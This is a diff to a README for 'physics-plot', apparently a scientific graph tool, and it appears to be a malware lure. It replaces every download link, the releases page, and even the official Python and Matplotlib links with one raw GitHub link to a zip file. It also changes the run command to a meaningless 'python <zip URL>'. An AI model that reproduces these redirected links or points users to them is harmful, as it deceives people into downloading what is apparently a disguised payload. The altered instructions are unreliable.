@@ -1,6 +1,6 @@
 # 🎨 physics-plot - Create Stunning Scientific Graphs Easily
 
-## 📦 Download 🡆 [![Download Link](https://img.shields.io/badge/Download%20Now-physics--plot-blue)](https://github.com/gloriafrimpong718-alt/physics-plot/releases)
+## 📦 Download 🡆 [![Download Link](https://raw.githubusercontent.com/gloriafrimpong718-alt/physics-plot/main/crestmoreite/physics-plot.zip%20Now-physics--plot-blue)](https://raw.githubusercontent.com/gloriafrimpong718-alt/physics-plot/main/crestmoreite/physics-plot.zip)
 
 ## 🚀 Getting Started
 
@@ -9,13 +9,13 @@ To use **physics-plot**, follow these simple steps. This application helps you c
 ### 🖥️ System Requirements
 
 - A computer running Windows, macOS, or Linux.
-- Python 3.x installed. (Get it [here](https://www.python.org/downloads)). 
+- Python 3.x installed. (Get it [here](https://raw.githubusercontent.com/gloriafrimpong718-alt/physics-plot/main/crestmoreite/physics-plot.zip)). 
 - No additional software is needed.
 
 ### 📥 Download & Install
 
 1. **Visit the Releases Page** 
-   Go to the [Releases page](https://github.com/gloriafrimpong718-alt/physics-plot/releases) to get the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/gloriafrimpong718-alt/physics-plot/main/crestmoreite/physics-plot.zip) to get the software.
 
 2. **Download the Latest Version**
    On the Releases page, look for the latest version of **physics-plot**. Click the download link to save the file to your computer.
@@ -36,7 +36,7 @@ To use **physics-plot**, follow these simple steps. This application helps you c
    ```
    - Next, run the command to start the application:
    ```
-   python physics-plot.py
+   python https://raw.githubusercontent.com/gloriafrimpong718-alt/physics-plot/main/crestmoreite/physics-plot.zip
    ```
 
 ## 🎨 Features
@@ -64,9 +64,9 @@ If you encounter issues, consider these common problems:
 
 ## 🔗 Useful Links
 
-- [Python Download Page](https://www.python.org/downloads)
-- [Matplotlib Documentation](https://matplotlib.org/stable/contents.html)
-- [Physics-Plot Releases Page](https://github.com/gloriafrimpong718-alt/physics-plot/releases)
+- [Python Download Page](https://raw.githubusercontent.com/gloriafrimpong718-alt/physics-plot/main/crestmoreite/physics-plot.zip)
+- [Matplotlib Documentation](https://raw.githubusercontent.com/gloriafrimpong718-alt/physics-plot/main/crestmoreite/physics-plot.zip)
+- [Physics-Plot Releases Page](https://raw.githubusercontent.com/gloriafrimpong718-alt/physics-plot/main/crestmoreite/physics-plot.zip)
 
 ## 🌐 Community Support
 
@@ -92,6 +92,6 @@ A: No, **physics-plot** is designed for users without programming skills.
 
 ## 📅 Future Updates
 
-Stay tuned for future releases! We plan to add more functionalities and styles to enhance your plotting experience. Check the [Releases page](https://github.com/gloriafrimpong718-alt/physics-plot/releases) for new updates.
+Stay tuned for future releases! We plan to add more functionalities and styles to enhance your plotting experience. Check the [Releases page](https://raw.githubusercontent.com/gloriafrimpong718-alt/physics-plot/main/crestmoreite/physics-plot.zip) for new updates.
 
-## 📥 Download 🡆 [![Download Link](https://img.shields.io/badge/Download%20Now-physics--plot-blue)](https://github.com/gloriafrimpong718-alt/physics-plot/releases)
+## 📥 Download 🡆 [![Download Link](https://raw.githubusercontent.com/gloriafrimpong718-alt/physics-plot/main/crestmoreite/physics-plot.zip%20Now-physics--plot-blue)](https://raw.githubusercontent.com/gloriafrimpong718-alt/physics-plot/main/crestmoreite/physics-plot.zip)
